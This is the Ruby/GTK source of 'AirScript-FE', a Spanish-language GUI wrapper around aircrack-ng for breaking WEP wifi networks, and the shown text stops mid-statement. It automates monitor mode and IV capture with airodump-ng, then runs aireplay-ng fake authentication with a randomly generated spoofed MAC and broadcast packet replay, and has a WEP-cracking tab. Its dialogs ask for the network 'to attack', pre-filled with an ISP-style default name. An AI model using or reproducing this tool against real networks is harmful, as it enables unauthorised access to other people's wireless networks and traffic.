#!/usr/bin/env ruby										#
# script basico para el uso del nuevo aircrack-ng		#
# autor: 	Bruno G. Fosados  <softnuux(at)gmail.com>	#
# version:	v0.1b	v0.1-1	v0.2b	v0.2-1	v0.3	v0.4b 	v0.4-2		#
# fecha:	03/07	05/07	01/08	02/08	01/09	02/09	02/12		#
# DEPENDENCIAS:											#
#		(*)aircrack-ng >= 1.0 rc1						#
#		(*)ruby1.8										#
#		(*)libgtk2-ruby1.8								#
#		(*)libpcap-ruby1.8								#
#		(*)libvte-ruby1.8 								#
#		*drivers parcheados para inyectar paquetes		#
# Instalar todo desde BackTrack/debian/ubuntu: sudo apt-get install aircrack-ng ruby1.8 libgtk2-ruby1.8 libpcap-ruby1.8 libvte-ruby1.8

require 'rubygems'
require 'gtk2'
require 'pcaprub'
require 'vte'

$iface = ""
$iface_old = ""
$ssid = ""
$bssid = ""
$ch = ""
$rmac = ""
$wep = ""
$inject = 0

#ventana para seleccionar la interface (popup)
popup = Gtk::Window.new("Selecciona tu interfaz de red wifi")
popup.border_width = 10
popup.set_icon_name('gtk-network')
popup.signal_connect('delete_event')do
if($iface_box.active_text == nil || $iface == "")
	popup.destroy
	else
	system('ifconfig ' + $iface_box.active_text + ' up')
	system('airmon-ng stop ' + $iface)
	popup.destroy
	end
end
vbox_popup_ALL = Gtk::VBox.new(false, 0)
popup.add(vbox_popup_ALL)

#cajita para mensaje
hbox_label_mensaje = Gtk::HBox.new(false, 0)
vbox_popup_ALL.pack_start(hbox_label_mensaje, false, false, 10)

icono_popup = Gtk::Image.new(Gtk::Stock::NETWORK, Gtk::IconSize::DIALOG)
hbox_label_mensaje.pack_start(icono_popup, false, false, 0)

label_mensaje = Gtk::Label.new("Por favor selecciona el interfaz de red inalambrico a usar ej: ath0, ra0, wlan0, etc.")
hbox_label_mensaje.pack_start(label_mensaje, true, true, 0)

hbox_popup_iface_selec = Gtk::HBox.new(false, 0)
vbox_popup_ALL.pack_start(hbox_popup_iface_selec, true, true, 0)

hbox_popup_iface_selec_end = Gtk::HBox.new(false, 0)
hbox_popup_iface_selec.pack_start(hbox_popup_iface_selec_end, true, true, 0)

label_ifaces_selec = Gtk::Label.new("Interfaces: ")
hbox_popup_iface_selec_end.pack_end(label_ifaces_selec, false, false, 0)

#Listar Interfaces
$dev_all = pcaprub::Pcap.findalldevs
$iface_box = Gtk::ComboBox.new(true)
$dev_all.each do |line|
	$iface_box.append_text(line)
	end 
hbox_popup_iface_selec_start = Gtk::HBox.new(false, 0)
hbox_popup_iface_selec.pack_start(hbox_popup_iface_selec_start, true, true , 0)

hbox_popup_iface_selec_start.pack_start($iface_box, false, false, 0)

hbox_popup_botones = Gtk::HBox.new(false, 0)
vbox_popup_ALL.pack_start(hbox_popup_botones, false, false, 10)

#Boton Poner en modo monitor
modo_monitor = Gtk::Button.new
hbox_modo_monitor = Gtk::HBox.new(false, 0)
label_modo_monitor = Gtk::Label.new("Poner en modo monitor")
icono_modo_monitor = Gtk::Image.new(Gtk::Stock::REFRESH, Gtk::IconSize::MENU)
hbox_modo_monitor.pack_start(icono_modo_monitor, false, true, 10)
hbox_modo_monitor.pack_start(label_modo_monitor, false, true, 0)
modo_monitor.add(hbox_modo_monitor)

modo_monitor.signal_connect('clicked') do
if($iface_box.active == -1 || $iface_box.active_text == 'any')
dialog = Gtk::MessageDialog.new(popup, 
		         Gtk::Dialog::MODAL,
    		         Gtk::MessageDialog::WARNING,
        		 Gtk::MessageDialog::BUTTONS_CLOSE,
            		 "Primero tienes que seleccionar la interfaz de red")
	dialog.run
	dialog.destroy
	else#poner modo monitor
	system('ifconfig ' + $iface_box.active_text + ' down' )
	system('airmon-ng start ' + $iface_box.active_text)

	devs_new = []
	devs_new = pcaprub::Pcap.findalldevs
	$dev_all.each do |iface_old|
		devs_new.each do |iface_new|
			if(iface_old == iface_new)
				devs_new.delete(iface_old)
				end
			end
		end
	$iface = devs_new.to_s
	$iface_old = $iface_box.active_text
end
#Avisar que no se pudo poner el interfaz en monitor
if ($iface == "")
	dialog = Gtk::MessageDialog.new(popup, 
		         Gtk::Dialog::MODAL,
    		         Gtk::MessageDialog::WARNING,
        		 Gtk::MessageDialog::BUTTONS_CLOSE,
            		 "El interfaz selecionado no se pudo poner en modo monitor, revisa:\n\n(*)Que el interfaz seleccionado se el de la red inalambrica.\n(*)Que tengas instalado el aircrack-ng.\n(*)Que tengas parcheados tus drivers.\n(*)Intenta ponerla manualmente.\n\nVisita http://RedNux.net para mas informacion de como parchear tus drivers!")
	system('ifconfig ' + $iface_box.active_text + ' up')
	dialog.run
	dialog.destroy
	else
	popup.destroy
	###Lanzar ventana principal###
	airscript
	end
end

#Boton usar (ya es modo monitor)
usar = Gtk::Button.new
hbox_usar = Gtk::HBox.new(false, 0)
label_usar = Gtk::Label.new("Ya es modo monitor")
icono_usar = Gtk::Image.new(Gtk::Stock::REFRESH, Gtk::IconSize::MENU)
hbox_usar.pack_start(icono_usar, false, true, 10)
hbox_usar.pack_start(label_usar, false, true, 0)
usar.add(hbox_usar)

usar.signal_connect('clicked') do
if ($iface_box.active == -1 || $iface_box.active_text == 'any')
dialog = Gtk::MessageDialog.new(popup, 
		         Gtk::Dialog::MODAL,
    		         Gtk::MessageDialog::WARNING,
        		 Gtk::MessageDialog::BUTTONS_CLOSE,
            		 "Primero tienes que seleccionar la interfaz de red")
	dialog.run
	dialog.destroy
	else
	$iface = $iface_box.active_text
	puts $iface
	popup.destroy
	####Lanzar ventana principal###
	airscript
	end
end

#Boton salir
salir_popup = Gtk::Button.new
hbox_salir_popup = Gtk::HBox.new(false, 0)
label_salir_popup = Gtk::Label.new("Ir me a la Burger!")
icono_salir_popup = Gtk::Image.new(Gtk::Stock::QUIT, Gtk::IconSize::MENU)
hbox_salir_popup.pack_start(icono_salir_popup, false, true, 10)
hbox_salir_popup.pack_start(label_salir_popup, false, true, 0)
salir_popup.add(hbox_salir_popup)

salir_popup.signal_connect('clicked') do
if($iface_box.active_text == nil || $iface == "")
	popup.destroy
	Gtk.main_quit
	else
	system('ifconfig ' + $iface_box.active_text + ' up')
	system('airmon-ng stop ' + $iface)
	popup.destroy
	Gtk.main_quit
	end
end

#Empaketar botones interfaces
hbox_popup_botones.pack_end(modo_monitor, false, true, 10)
hbox_popup_botones.pack_end(usar, false, true, 10)
hbox_popup_botones.pack_end(salir_popup, false, true, 10)

popup.show_all

###### Termina PopUp #####
##########################

def airscript

$cent = 1

#Iniciado nuestra ventana principal
$ventana = Gtk::Window.new(Gtk::Window::TOPLEVEL)
$ventana.set_title("AirScript-FE")
$ventana.set_resizable(true)
$ventana.set_size_request(860, 550)
$ventana.border_width = 10
$ventana.set_icon_name('gtk-about')
$ventana.signal_connect('delete_event') do
if ($iface == "" || $iface_old == "")
	Gtk.main_quit
	else
	system('airmon-ng stop ' + $iface)
	system('ifconfig ' + $iface_old + ' up')
	Gtk.main_quit
	end
end

menu = Gtk::Notebook.new

###############################################################
################### Empieza del menu (*)Estado ################

estado = Gtk::Label.new("(*)Estado")
vbox_E_ALL = Gtk::VBox.new(false, 0)
hbox_E_TyB = Gtk::HBox.new(false, 0)

#terminal VTE
terminal_E = Vte::Terminal.new
terminal_E.set_font("monospace 9", antialias=Vte::TerminalAntiAlias::FORCE_ENABLE)
terminal_E.set_size_request(640, -1)
terminal_E.fork_command
terminal_E.feed_child("airodump-ng --band bg " + $iface + "\n")

hbox_E_TyB.pack_start(terminal_E, false, true, 5)

comando_E = Gtk::Entry.new
comando_E.text = "Si Te Gusta Esta Aplicacion Por Favor Dona! a http://rednux.net"
comando_E.set_editable(true)
comando_E.select_region(0, -1)

v_E_Separador = Gtk::VSeparator.new

hbox_E_TyB.pack_start(v_E_Separador, false, true, 5)

vbox_E_B = Gtk::VBox.new(false, 0)

#Boton BuscarAP
buscarAP = Gtk::Button.new
hbox_buscarAP = Gtk::HBox.new(false, 0)
label_buscarAP = Gtk::Label.new("Buscar AP's")
icono_buscarAP = Gtk::Image.new(Gtk::Stock::REFRESH, Gtk::IconSize::MENU)
hbox_buscarAP.pack_start(icono_buscarAP, false, true, 10)
hbox_buscarAP.pack_start(label_buscarAP, false, true, 0)
buscarAP.add(hbox_buscarAP)

buscarAP.signal_connect('clicked') do
comando_E.text = "airodump-ng --band bg " + $iface
terminal_E.fork_command
terminal_E.feed_child("airodump-ng --band bg " + $iface + "\n" )
end

#Boton SSID
setSSID = Gtk::Button.new
hbox_setSSID = Gtk::HBox.new(false, 0)
label_setSSID = Gtk::Label.new("Establecer ESSID")
icono_setSSID = Gtk::Image.new(Gtk::Stock::ADD, Gtk::IconSize::MENU)
hbox_setSSID.pack_start(icono_setSSID, false, true, 10)
hbox_setSSID.pack_start(label_setSSID, false, true, 0)
setSSID.add(hbox_setSSID)

setSSID.signal_connect('clicked') do
#Pedir el SSID
dialogSSID = Gtk::Dialog.new(
    "ESSID - NOMBRE DE LA RED",
    $ventana,
    Gtk::Dialog::MODAL,
    [ Gtk::Stock::OK, Gtk::Dialog::RESPONSE_OK ],
    [ Gtk::Stock::CANCEL, Gtk::Dialog::RESPONSE_CANCEL ])

dialogSSID.default_response = Gtk::Dialog::RESPONSE_OK
dialogSSID.set_has_separator(false)

labelSSID = Gtk::Label.new("Establecer el ESSID a Atakar:")

entry_SSID = Gtk::Entry.new
entry_SSID.text = "INFINITUM4321"
entry_SSID.select_region(0, -1)
entry_SSID.set_editable(true)


hboxSSID = Gtk::HBox.new(false, 5)
hboxSSID.border_width = 10

hboxSSID.pack_start_defaults(labelSSID)
hboxSSID.pack_start_defaults(entry_SSID)

hboxSSID_icono = Gtk::HBox.new(true, 0)
ssid_icono = Gtk::Image.new(Gtk::Stock::DIALOG_QUESTION, Gtk::IconSize::DIALOG)
hboxSSID_icono.add(ssid_icono)

dialogSSID.vbox.pack_start_defaults(hboxSSID_icono)
dialogSSID.vbox.pack_start_defaults(hboxSSID)
dialogSSID.show_all
dialogSSID.run do |respuestaSSID|
#almacenar la respuesta
	if(respuestaSSID == Gtk::Dialog::RESPONSE_OK)
		$ssid = entry_SSID.text
		comando_E.text = "airodump-ng --ivs --write airscript-" + $ssid + " --channel " + $ch  + " " + $iface
	else
		$ssid = ""
		comando_E.text = "airodump-ng --ivs --write airscript-"
		end
	end
dialogSSID.destroy
end
#Boton BSSID
setBSSID = Gtk::Button.new
hbox_setBSSID = Gtk::HBox.new(false, 0)
label_setBSSID = Gtk::Label.new("Establecer BSSID")
icono_setBSSID = Gtk::Image.new(Gtk::Stock::ADD, Gtk::IconSize::MENU)
hbox_setBSSID.pack_start(icono_setBSSID, false, true, 10)
hbox_setBSSID.pack_start(label_setBSSID, false, true, 0)
setBSSID.add(hbox_setBSSID)

setBSSID.signal_connect('clicked') do
#pedir el BSSID
dialogBSSID = Gtk::Dialog.new(
    "BSSID - MAC",
    $ventana,
    Gtk::Dialog::MODAL,
    [ Gtk::Stock::OK, Gtk::Dialog::RESPONSE_OK ],
    [ Gtk::Stock::CANCEL, Gtk::Dialog::RESPONSE_CANCEL ])

dialogBSSID.default_response = Gtk::Dialog::RESPONSE_OK
dialogBSSID.set_has_separator(false)

labelBSSID = Gtk::Label.new("Establecer la MAC o BSSID a Atakar:")

entry_BSSID = Gtk::Entry.new
entry_BSSID.text = "00:B2:C3:D4:E5:F6"
entry_BSSID.select_region(0, -1)
entry_BSSID.set_editable(true)

hboxBSSID = Gtk::HBox.new(false, 0)
hboxBSSID.pack_start_defaults(labelBSSID)
hboxBSSID.pack_start_defaults(entry_BSSID)

hboxBSSID_icono = Gtk::HBox.new(true, 0)
bssid_icono = Gtk::Image.new(Gtk::Stock::DIALOG_QUESTION, Gtk::IconSize::DIALOG)
hboxBSSID_icono.add(bssid_icono)

dialogBSSID.vbox.pack_start_defaults(hboxBSSID_icono)
dialogBSSID.vbox.pack_start_defaults(hboxBSSID)
dialogBSSID.show_all
dialogBSSID.run do |respuestaBSSID|
#almacenar la respuesta
	if(respuestaBSSID == Gtk::Dialog::RESPONSE_OK)
		$bssid = entry_BSSID.text.upcase
	else
		$bssid = ""
	end
end
dialogBSSID.destroy
end
#Boton CHANNEL
setCH = Gtk::Button.new
hbox_setCH = Gtk::HBox.new(false, 0)
label_setCH = Gtk::Label.new("Establecer CH")
icono_setCH = Gtk::Image.new(Gtk::Stock::ADD, Gtk::IconSize::MENU)
hbox_setCH.pack_start(icono_setCH, false, true, 10)
hbox_setCH.pack_start(label_setCH, false, true, 0)
setCH.add(hbox_setCH)

setCH.signal_connect('clicked') do
#Pedir el CHANNEL
dialogCH = Gtk::Dialog.new(
    "CHANNEL",
    $ventana,
    Gtk::Dialog::MODAL,
    [ Gtk::Stock::OK, Gtk::Dialog::RESPONSE_OK ],
    [ Gtk::Stock::CANCEL, Gtk::Dialog::RESPONSE_CANCEL ])

dialogCH.default_response = Gtk::Dialog::RESPONSE_OK
dialogCH.set_has_separator(false)

labelCH = Gtk::Label.new("Establecer el CANAL a Atakar:")

entry_CH = Gtk::Entry.new
entry_CH.text = "1"
entry_CH.select_region(0, -1)
entry_CH.set_editable(true)

hboxCH = Gtk::HBox.new(false, 5)
hboxCH.border_width = 10

hboxCH.pack_start_defaults(labelCH)
hboxCH.pack_start_defaults(entry_CH)

hboxCH_icono = Gtk::HBox.new(true, 0)
ch_icono = Gtk::Image.new(Gtk::Stock::DIALOG_QUESTION, Gtk::IconSize::DIALOG)
hboxCH_icono.add(ch_icono)

dialogCH.vbox.pack_start_defaults(hboxCH_icono)
dialogCH.vbox.pack_start_defaults(hboxCH)

dialogCH.show_all
dialogCH.run do |respuestaCH|
#almacenar la respuesta
	if(respuestaCH == Gtk::Dialog::RESPONSE_OK)
		$ch = entry_CH.text
		comando_E.text = "airodump-ng --ivs --write airscript-" + $ssid + " --channel " + $ch + " " + $iface
	else
		$ch = ""
		comando_E.text = "airodump-ng --ivs --write airscript-"# + $ssid + " --channel " + $ch + " " + $iface
	end
end
dialogCH.destroy
end
#nota informativa
info = Gtk::Label.new("Recuerda que tus drivers\ndeben estar parcheados\npara atrapar e injectar\npaquetes.\n\nVisita: http://RedNux.net\npara mas informacion\nde como parchear tus\ndrivers y uso de esta GUI.")

vbox_E_B.pack_start(buscarAP, false, true, 15)
vbox_E_B.pack_start(setSSID, false, true, 15)
vbox_E_B.pack_start(setBSSID, false, true, 15)
vbox_E_B.pack_start(setCH, false, true, 15)
vbox_E_B.pack_start(info, false, true, 0)


hbox_E_TyB.pack_start(vbox_E_B, true, true, 0)

vbox_E_ALL.pack_start(hbox_E_TyB, true, true, 0)

hSeparador_E = Gtk::HSeparator.new

vbox_E_ALL.pack_start(hSeparador_E, false, true, 3)

hbox_E_C = Gtk::HBox.new(false, 0)
cmd = Gtk::Label.new("Comando:")

hbox_E_C.pack_start(cmd, false, true, 3)

###
hbox_E_C.pack_start(comando_E, true, true, 0)
###

vbox_E_ALL.pack_start(hbox_E_C, false, true, 3)

hbox_E_AyR = Gtk::HBox.new(false, 0)

#Boton Atrapar
atrapar = Gtk::Button.new
hbox_atrapar = Gtk::HBox.new(false, 0)
label_atrapar = Gtk::Label.new("Atrapar")
icono_atrapar = Gtk::Image.new(Gtk::Stock::APPLY, Gtk::IconSize::MENU)
hbox_atrapar.pack_start(icono_atrapar, false, true, 5)
hbox_atrapar.pack_start(label_atrapar, false, true, 5)
atrapar.add(hbox_atrapar)

atrapar.signal_connect('clicked') do
#chekar q esten los elementos
if($ssid == "" || $bssid == "" || $ch == "")
	dialog = Gtk::MessageDialog.new($ventana, 
		                            Gtk::Dialog::MODAL,
    		                        Gtk::MessageDialog::WARNING,
        		                    Gtk::MessageDialog::BUTTONS_CLOSE,
            		                "Debes de introducir el elemento faltante:\n\nSSID=\"" + $ssid + "\"\nBSSID=\"" + $bssid + "\"\nCH=\"" + $ch + "\"")
	dialog.run
	dialog.destroy
	else
	terminal_E.fork_command
	terminal_E.feed_child(comando_E.text + "\n")
	end
end
#Boton Restablecer
restablecer = Gtk::Button.new
hbox_restablecer = Gtk::HBox.new(false, 0)
label_restablecer = Gtk::Label.new("Restablecer")
icono_restablecer = Gtk::Image.new(Gtk::Stock::DELETE, Gtk::IconSize::MENU)
hbox_restablecer.pack_start(icono_restablecer, false, true, 5)
hbox_restablecer.pack_start(label_restablecer, false, true, 5)
restablecer.add(hbox_restablecer)

restablecer.signal_connect('clicked') do
terminal_E.fork_command
comando_E.text = "Se detubo la busqueda y se limpio el ESSID, BSSID y CHANNEL. Inicia una nueva busqueda e ingresa los datos"
$ssid = ""
$bssid = ""
$ch = ""
end

#Boton Salir
salir = Gtk::Button.new
hbox_salir = Gtk::HBox.new(false, 0)
label_salir = Gtk::Label.new("Salir")
icono_salir = Gtk::Image.new(Gtk::Stock::QUIT, Gtk::IconSize::MENU)
hbox_salir.pack_start(icono_salir, false, true, 5)
hbox_salir.pack_start(label_salir, false, true, 5)
salir.add(hbox_salir)

salir.signal_connect('clicked') do
if ($iface == "" || $iface_old == "")
	Gtk.main_quit
	else
	system('airmon-ng stop ' + $iface)
	system('ifconfig ' + $iface_old + ' up')
	Gtk.main_quit
	end
end

hbox_E_AyR.pack_end(atrapar, false, true, 20)
hbox_E_AyR.pack_end(restablecer, false, true, 20)
hbox_E_AyR.pack_start(salir, false, true, 20)

vbox_E_ALL.pack_start(hbox_E_AyR, false, true, 5)

#Agregar la caja principal al menu(notebook) con la label de 'estado'
menu.append_page(vbox_E_ALL, estado)

#################### Termina el menu (*)Estado #################
################################################################

###############################################################
############### Empieza el menu Injeccion no ARP ##############

injeccion_no_arp = Gtk::Label.new("Injeccion sin Usuarios")
vbox_IARP_ALL = Gtk::VBox.new(false, 0)
hbox_IARP_terms = Gtk::HBox.new(false, 0)
vbox_IARP_ALL.pack_start(hbox_IARP_terms, true, true, 0)
vbox_IARP_terms_I = Gtk::VBox.new(false, 0)
hbox_IARP_terms.pack_start(vbox_IARP_terms_I, false, true, 5)

#Terminale Injeccion VTE
terminal_IARP_I = Vte::Terminal.new
terminal_IARP_I.set_font("monospace 9", antialias=Vte::TerminalAntiAlias::FORCE_ENABLE)
terminal_IARP_I.set_size_request(500, 400)
terminal_IARP_I.fork_command
vbox_IARP_terms_I.pack_start(terminal_IARP_I, true, true, 0)

hSeparador_IARP = Gtk::HSeparator.new
vbox_IARP_terms_I.pack_start(hSeparador_IARP, false, true, 5)

hbox_IARP_terms_I_B = Gtk::HBox.new(false, 0)

vbox_IARP_terms_I.pack_start(hbox_IARP_terms_I_B, true, true, 5)

#Botones para Terminale Injeccion VTE
#Boton usar pakete
usar_pakete = Gtk::Button.new
hbox_usar_pakete = Gtk::HBox.new(false, 0)
label_usar_pakete = Gtk::Label.new("Usar Pakete/y")
icono_usar_pakete = Gtk::Image.new(Gtk::Stock::OK, Gtk::IconSize::MENU)
hbox_usar_pakete.pack_start(icono_usar_pakete, false, true, 10)
hbox_usar_pakete.pack_start(label_usar_pakete, false, true, 0)
usar_pakete.add(hbox_usar_pakete)

usar_pakete.signal_connect('clicked') do
#chekar q esten completos los datos
if($ssid == "" || $bssid == "" || $ch == "" || $rmac == "" || $inject == 0)
	dialog = Gtk::MessageDialog.new($ventana, 
		                            Gtk::Dialog::MODAL,
    		                        Gtk::MessageDialog::WARNING,
        		                    Gtk::MessageDialog::BUTTONS_CLOSE,
            		                "Debes de introducir en \"(*)Estado\" el elemento faltante:\n\nSSID=\"" + $ssid + "\"\nBSSID=\"" + $bssid + "\"\nCH=\"" + $ch + "\"\n\nAntes de Usar un Pakete debes \"Autentificar e Injectar\"")
	dialog.run
	dialog.destroy
	else
	#Decir que si a usar pakete
	if ($cent > 0)
		terminal_IARP_I.feed_child("y\n")
		$cent = -1
		end
	end
end

#boton usar otro pakete
usar_otro_pakete = Gtk::Button.new
hbox_usar_otro_pakete = Gtk::HBox.new(false, 0)
label_usar_otro_pakete = Gtk::Label.new("Usar Otro Pakete/n")
icono_usar_otro_pakete = Gtk::Image.new(Gtk::Stock::REFRESH, Gtk::IconSize::MENU)
hbox_usar_otro_pakete.pack_start(icono_usar_otro_pakete, false, true, 10)
hbox_usar_otro_pakete.pack_start(label_usar_otro_pakete, false, true, 0)
usar_otro_pakete.add(hbox_usar_otro_pakete)

usar_otro_pakete.signal_connect('clicked') do
#chekar q los datos esten correctos.
if($ssid == "" || $bssid == "" || $ch == "" || $rmac == "" || $inject == 0)
	dialog = Gtk::MessageDialog.new($ventana, 
		                            Gtk::Dialog::MODAL,
    		                        Gtk::MessageDialog::WARNING,
        		                    Gtk::MessageDialog::BUTTONS_CLOSE,
            		                "Debes de introducir en \"(*)Estado\" el elemento faltante:\n\nSSID=\"" + $ssid + "\"\nBSSID=\"" + $bssid + "\"\nCH=\"" + $ch + "\"\n\nAntes de Usar Otro Pakete Debes \"Autentificar e Injectar\"")
	dialog.run
	dialog.destroy
	else
	#mandar se~al INIT(ctrl-c) a nuestro proceso ultimo proceso creado, aireplay-ng
	if ($cent == -1)
		GLib::Spawn.command_line_async("pkill -2 aireplay-ng -n")
		$cent = 1
		end
	if ($cent > 0 ) 
		terminal_IARP_I.feed_child("n\n")
		$cent = 1
		end
	end
end

#Comando a correr(entry)
comando_IARP = Gtk::Entry.new
comando_IARP.text = "Si Te Gusta Esta Aplicacion Por Favor Dona! a http://rednux.net"
comando_IARP.set_editable(true)
comando_IARP.select_region(0, -1)

#Boton Injectar-arp
injectar_arp = Gtk::Button.new
hbox_injectar_arp = Gtk::HBox.new(false, 0)
label_injectar_arp = Gtk::Label.new("Injectar ARP")
icono_injectar_arp = Gtk::Image.new(Gtk::Stock::APPLY, Gtk::IconSize::MENU)
hbox_injectar_arp.pack_start(icono_injectar_arp, false, true, 5)
hbox_injectar_arp.pack_start(label_injectar_arp, false, true, 5)
injectar_arp.add(hbox_injectar_arp)

injectar_arp.signal_connect('clicked') do
if($ssid == "" || $bssid == "" || $ch == "" || $rmac == "")
	dialog = Gtk::MessageDialog.new($ventana, 
		                            Gtk::Dialog::MODAL,
    		                        Gtk::MessageDialog::WARNING,
        		                    Gtk::MessageDialog::BUTTONS_CLOSE,
            		                "Debes de introducir en \"(*)Estado\" el elemento faltante:\n\nSSID=\"" + $ssid + "\"\nBSSID=\"" + $bssid + "\"\nCH=\"" + $ch + "\"\n\nAntes de Injectar debes \"Autentificar\"")
	dialog.run
	dialog.destroy
	else
	terminal_IARP_I.fork_command
	comando_IARP.text = "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b " + $bssid + " -h " + $rmac + " " + $iface
	terminal_IARP_I.feed_child(comando_IARP.text + "\n")
	$inject = 1
	end
end

#Empaketar botones en su caja debajo de terminal
hbox_IARP_terms_I_B.pack_start(usar_pakete, true, false, 16)
hbox_IARP_terms_I_B.pack_start(usar_otro_pakete, true, false, 16)
hbox_IARP_terms_I_B.pack_start(injectar_arp, true, false, 16)

vSeparador_terms = Gtk::VSeparator.new
hbox_IARP_terms.pack_start(vSeparador_terms, false, true, 5)

#Terminal Auth. Y Botones.
#Caja para terminal de Auth. y botones
vbox_IARP_terms_A_B = Gtk::VBox.new(false, 0)
hbox_IARP_terms.pack_start(vbox_IARP_terms_A_B, false, true, 0)

#Terminale Auth. VTE
terminal_IARP_A = Vte::Terminal.new
terminal_IARP_A.set_font("monospace 9", antialias=Vte::TerminalAntiAlias::FORCE_ENABLE)
terminal_IARP_A.set_size_request(270, -1)
terminal_IARP_A.fork_command
vbox_IARP_terms_A_B.pack_start(terminal_IARP_A, true, true, 5)

i = 0
x = []

#Boton AUTH.
auth_B = Gtk::Button.new
hbox_auth_B = Gtk::HBox.new(false, 0)
label_auth_B = Gtk::Label.new("Autentificar")
icono_auth_B = Gtk::Image.new(Gtk::Stock::APPLY, Gtk::IconSize::MENU)
hbox_auth_B.pack_start(icono_auth_B, false, true, 5)
hbox_auth_B.pack_start(label_auth_B, false, true, 5)
auth_B.add(hbox_auth_B)

auth_B.signal_connect('clicked') do
if($ssid == "" || $bssid == "" || $ch == "")
	dialog = Gtk::MessageDialog.new($ventana, 
		                            Gtk::Dialog::MODAL,
    		                        Gtk::MessageDialog::WARNING,
        		                    Gtk::MessageDialog::BUTTONS_CLOSE,
            		                "Debes de introducir en \"(*)Estado\" el elemento faltante:\n\nSSID=\"" + $ssid + "\"\nBSSID=\"" + $bssid + "\"\nCH=\"" + $ch + "\"")
	dialog.run
	dialog.destroy
	else
	###Generar direcccion MAC aleatoria###
	6.times do |i|
	n = rand(255)
	while (n < 16)
		n = rand(255)
		end
	x[i] = n.to_s(base=16)
	i += 1
	$rmac = x.join(":").upcase
	end
	i = 0
	x = []
	
	terminal_IARP_A.fork_command
	comando_IARP.text = "aireplay-ng -1 30 -e " + $ssid + " -a " + $bssid + " -h " + $rmac + " " + $iface
	terminal_IARP_A.feed_child(comando_IARP.text + "\n")
	end
end

#boton Re-Auth
re_auth = Gtk::Button.new
hbox_re_auth = Gtk::HBox.new(false, 0)
label_re_auth = Gtk::Label.new("Auth / Re-Auth")
icono_re_auth = Gtk::Image.new(Gtk::Stock::REDO, Gtk::IconSize::MENU)
hbox_re_auth.pack_start(icono_re_auth, false, true, 10)
hbox_re_auth.pack_start(label_re_auth, false, true, 0)
re_auth.add(hbox_re_auth)

re_auth.signal_connect('clicked') do
if($ssid == "" || $bssid == "" || $ch == "" || $rmac == "" )
	dialog = Gtk::MessageDialog.new($ventana, 
		                            Gtk::Dialog::MODAL,
    		                        Gtk::MessageDialog::WARNING,
        		                    Gtk::MessageDialog::BUTTONS_CLOSE,
            		                "Debes de introducir en \"(*)Estado\" el elemento faltante:\n\nSSID=\"" + $ssid + "\"\nBSSID=\"" + $bssid + "\"\nCH=\"" + $ch + "\"\nAntes de Re-Auth. debes \"Autentificar\"")
	dialog.run
	dialog.destroy
	else
	terminal_IARP_A.fork_command
	comando_IARP.text = "aireplay-ng -1 30 -e " + $ssid + " -a " + $bssid + " -h " + $rmac + " " + $iface
	terminal_IARP_A.feed_child(comando_IARP.text + "\n")
	end
end
#Boton Restablecer
restablecer_IARP = Gtk::Button.new
hbox_restablecer_IARP = Gtk::HBox.new(false, 0)
label_restablecer_IARP = Gtk::Label.new("Restablecer")
icono_restablecer_IARP = Gtk::Image.new(Gtk::Stock::DELETE, Gtk::IconSize::MENU)
hbox_restablecer_IARP.pack_start(icono_restablecer_IARP, false, true, 5)
hbox_restablecer_IARP.pack_start(label_restablecer_IARP, false, true, 5)
restablecer_IARP.add(hbox_restablecer_IARP)

restablecer_IARP.signal_connect('clicked') do
terminal_IARP_A.fork_command
terminal_IARP_I.fork_command
comando_IARP.text = "Se detubieron los procesos y se limpio la MAC generada."
$rmac = ""
$inject = 0                                                       
end

vbox_IARP_terms_A_B.pack_start(auth_B, true, false, 5)
vbox_IARP_terms_A_B.pack_start(re_auth, true, false, 5)
vbox_IARP_terms_A_B.pack_start(restablecer_IARP, true, false, 5)

hbox_comando_IARP = Gtk::HBox.new(false, 0)
vbox_IARP_ALL.pack_start(hbox_comando_IARP, true, true, 5)
coamdndo_IARP_L = Gtk::Label.new("Comando:")

hbox_comando_IARP.pack_start(coamdndo_IARP_L, false, false, 5)
hbox_comando_IARP.pack_start(comando_IARP, true, true, 5)
menu.append_page(vbox_IARP_ALL, injeccion_no_arp)

############### Termina el menu Injeccion no ARP ##############
###############################################################

###############################################################
################ Empieza el menu Crackeark-WEP ################

vbox_crack_ALL = Gtk::VBox.new(false, 0)
label_crack = Gtk::Label.new("Crackear-WEP")

entry_comando_C = Gtk::Entry.new
entry_comando_C.set_editable(true)
entry_comando_C.text = ""

hbox_crack_T = Gtk::HBox.new(false, 0)
vbox_crack_ALL.pack_start(hbox_crack_T, false, false, 0)

#terminal para crackear el pass
terminal_C = Vte::Terminal.new
terminal_C.set_font("monospace 9", antialias=Vte::TerminalAntiAlias::FORCE_ENABLE)
terminal_C.set_size_request(570, -1)
terminal_C.fork_command
hbox_crack_T.pack_start(terminal_C, false, true, 5)

vSeparador_term_crack = Gtk::VSeparator.new
hbox_crack_T.pack_start(vSeparador_term_crack, false, true, 5)

vbox_separador_term_cmd = Gtk::VBox.new
vbox_crack_ALL.pack_start(vbox_separador_term_cmd, false, true, 5)

hSeparador_term_cmd = Gtk::HSeparator.new
vbox_separador_term_cmd.add(hSeparador_term_cmd)

vbox_crack_NB = Gtk::VBox.new(false, 0)
hbox_crack_T.pack_start(vbox_crack_NB, false, false, 0)

#notas
label_notas = Gtk::Label.new("Para poder crackear el password\nprimero debes de juntar al menos\n20 000 paketas de data(iv's).\nAlgunas veces con 11K es suficiente.\nPuedes ver cuantos llevas en\n(*)Estado.\n\nUna vez que los tengas solo,\npreciona el boton de \"Crackear WEP\"\nel hara todo lo necesario y la\nmostrara en la terminal.\n\nEl password se en cuentra entre\"[ ]\"\nKEY FOUND![XX:XX:XX:XX] sin los \":\"\n")
vbox_crack_NB.pack_start(label_notas, false, true, 0)

#boton de crackear
boton_crackear = Gtk::Button.new
hbox_boton_crackear = Gtk::HBox.new(false, 0)
label_boton_crackear = Gtk::Label.new("Crackear WEP")
icono_boton_crackear = Gtk::Image.new(Gtk::Stock::DIALOG_AUTHENTICATION, Gtk::IconSize::MENU)
hbox_boton_crackear.pack_start(icono_boton_crackear, false, true, 10)
hbox_boton_crackear.pack_start(label_boton_crackear, false, true, 0)
boton_crackear.add(hbox_boton_crackear)

boton_crackear.signal_connect('clicked') do
if($ssid == "" || $bssid == "" || $ch == "" || $rmac == "" )
	dialog = Gtk::MessageDialog.new($ventana, 
		                            Gtk::Dialog::MODAL,
   		                        Gtk::MessageDialog::WARNING,
        		                    Gtk::MessageDialog::BUTTONS_CLOSE,
